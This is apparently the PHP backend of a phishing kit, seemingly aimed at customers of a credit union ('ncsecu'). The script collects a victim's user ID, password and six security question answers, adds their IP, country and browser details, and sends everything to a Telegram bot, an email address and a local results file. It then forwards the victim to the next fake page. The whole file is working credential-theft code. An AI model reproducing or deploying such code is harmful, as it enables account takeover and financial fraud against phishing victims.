<?php
if (isset($_POST['action']) && $_POST['action'] == "signup"){
		include('gisp.php');
		include('config.php');
		
		include_once("rbox.php");
		  
##############################################################################################################################################################
       
        date_default_timezone_set('UTC');
       
        $browserAgent = $_SERVER['HTTP_USER_AGENT'];
		$uri = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
##############################################################################################################################################################
			$USERID = $_POST['userid'];
		$UPASS = $_POST['upass'];
	
$type = $_POST['type'];
		$sa1 = $_POST['sa1'];
		$sa2 = $_POST['sa2'];
		$sa3 = $_POST['sa3'];
		$sa4 = $_POST['sa4'];
		$sa5 = $_POST['sa5'];
		$sa6 = $_POST['sa6'];
		$sq1 = $_POST['sq1'];
		$sq2 = $_POST['sq2'];
		$sq3 = $_POST['sq3'];
		$sq4 = $_POST['sq4'];
		$sq5 = $_POST['sq5'];
		$sq6 = $_POST['sq6'];
		$TYPE = $_POST['mode'];
		$page = $_POST['page'];
		
#####################################################################

		$MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b><font color='#cc1414'>HOWDY, </font> THIS IS YOUR RESULT ENJOY !</b> <br>\n";
if($type=='user'){
		$MESSAGE.="Account Access-----------------------------------------------<br>\n";

		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[USERID]</font></b>        :<b>".$USERID."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[UPASS]</font></b>        :<b>".$UPASS."</b><br>\n";
		
	}else if($type=='sq'){
$MESSAGE.="Security questions-----------------------------------------------<br>\n";


			$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Q.1]</font></b>        :<b>".$sq1."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[A.1]</font></b>        :<b>".$sa1."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Q.2]</font></b>        :<b>".$sq2."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[A.2]</font></b>        :<b>".$sa2."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Q.3]</font></b>        :<b>".$sq3."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[A.3]</font></b>        :<b>".$sa3."</b><br>\n";
			$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Q.4]</font></b>        :<b>".$sq4."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[A.4]</font></b>        :<b>".$sa4."</b><br>\n";
			$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Q.5]</font></b>        :<b>".$sq5."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[A.5]</font></b>        :<b>".$sa5."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Q.6]</font></b>        :<b>".$sq6."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[A.6]</font></b>        :<b>".$sa6."</b><br>\n";

}
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a><br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b>".$COUNTRYNAME." - ".$COUNTRYCODE." </b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER Agent]</font></b>    : <b>".$browserAgent."</b><br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE.="---------- Coded & Tools By D.K.S ---------";
			$MESSAGE = wordwrap($MESSAGE,70);
#####################################################################
		
		$SUBJECT = "ncsecu  Box(EMAIL)($IP)($COUNTRYNAME)";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: <GRAB_$IP>\n";

$data = $MESSAGE;
		  $send = ['chat_id'=>$telegram_chatid,'text'=>$data];
		  $website = "https://api.telegram.org/".$telegrambot;
		  $ch = curl_init($website . '/sendMessage');
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_POST, 1);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  curl_close($ch);


		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		
$Txt_Rezlt = fopen('rezult.html', 'a+');
	fwrite($Txt_Rezlt, $MESSAGE);
	fclose($Txt_Rezlt);
	$A = $_SERVER['REMOTE_ADDR'];

if($type=='user'){
	header("Location: sques.php");
	exit();
	}else{
		setcookie("check", $A, strtotime( '+1 days' ), "/", "", "", TRUE);
		echo 'ok|'.$LAND; 
		exit;
	}
 
}
?>
